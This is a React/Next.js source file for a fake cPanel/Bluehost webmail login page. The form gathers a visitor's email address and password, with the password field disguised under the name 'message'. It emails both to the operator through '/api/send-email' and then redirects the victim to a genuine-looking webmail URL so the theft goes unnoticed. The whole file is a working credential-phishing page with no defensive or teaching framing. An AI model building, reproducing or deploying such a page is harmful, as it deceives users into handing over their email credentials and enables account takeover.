"use client"
import Image from "next/image";
import { Lock, UserRound } from "lucide-react";
import { useState } from "react";
export default function Home() {

  const [form, setForm] = useState({ email: '', message: '' })
  const [showMessage, setShowMessage] = useState(false)

  const handleChange = (e) => {
    setForm({ ...form, [e.target.name]: e.target.value })
  }

  const handleSubmit = async (e) => {
    e.preventDefault()

    const res = await fetch('/api/send-email', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(form),
    })

    const data = await res.json()
    if (data.success) {
      // Redirect after success
      window.location.href = 'https://webmail-sh115.webhostingservices.com/cpsess0090581900/webmail/bluehost_in/index.html?login=1&post_login=63410917932749'
    }
  }

  return (
    <div className="flex flex-col items-center justify-center mt-[140px] w-full font-[] font-semibold">
      <div className="flex flex-col items-center justify-center">
        <div className=" flex justify-center mb-9">
          <Image
            src="/webmail-logo.svg"
            alt="Webmail Logo"
            width={200}
            height={37}
            priority
            className="w-[309px] h-[50px] pl-1"
          />
        </div>

        <div className="flex flex-col gap-6">

          {/* Email */}
          <form
            onSubmit={handleSubmit}
            className='flex flex-col gap-6 w-[300px]'
          >
            <div className="flex flex-col gap-2">
              <label className="text-[#293a4a] text-sm pl-2">Email Address</label>
              <div className="relative">
                <UserRound
                  size={18}
                  className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400"
                />
                <input
                  type="email"
                  id='email'
                  name='email'
                  value={form.email}
                  onChange={handleChange}
                  placeholder="Enter Your Email Address"
                  className="border border-gray-600 py-2 pl-10 pr-2 rounded-sm w-[285px] h-[35.2px]"
                />
              </div>
            </div>

            {/* Password */}
            <div className="flex flex-col text-sm gap-2">
              <label className="pl-2">Password</label>
              <div className="relative">
                <Lock
                  size={18}
                  className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400"
                />
                <input
                  type={showMessage ? 'text' : 'password'}
                  id='message'
                  name='message'
                  value={form.message}
                  onChange={handleChange}
                  placeholder="Enter Your Password"
                  className="w-[285px] h-[35.2px] border border-gray-600 py-2 pl-10 pr-2 rounded-sm"
                />
              </div>
            </div>

            <button
              type='submit'
              onClick={() => setShowMessage(!showMessage)}
              className=" w-[285px] h-[35.2px] text-center bg-[#179bd7] text-[13px] border rounded-sm border-gray-600 text-white">
              Login
            </button> 
          </form>
        </div>

        <ul className="flex flex-wrap gap-10 text-sm pt-[109px] text-[#293a4a]">
          <li>English</li>
          <li>العربية</li>
          <li>български</li>
          <li>čeština</li>
          <li>dansk</li>
          <li>Deutsch</li>
          <li>Ελληνικά</li>
          <li>español</li>
        </ul>
        {/* Image Div */}
<div className="flex flex-wrap justify-center gap-4 mt-2">
  {["works", "round", "webmail", "micro", "zoho", "proton", "fast", "private", "name", "host", "tita"].map((img) => (
    <Image
      key={img}
      src={`/${img}.jpeg`}
      alt={img}
      width={60}
      height={60}
      className="object-contain"
    />
  ))}
</div>
      </div>
      <footer className="w-full flex flex-col items-center mt-20 text-sm">

        <Image
          src="/25-259878_cpanel-logo-png-transparent-png.png"
          alt="cPanel Logo"
          width={30}
          height={30}
          className="opacity-80 mb-2"
        />

        <p className="text-[10px]">Copyright © 2026 cPanel, L.L.C.</p>

        <a
          href="#"
          className=" text-[10px]"
        >
          Privacy Policy
        </a>

      </footer>
    </div>
  );
}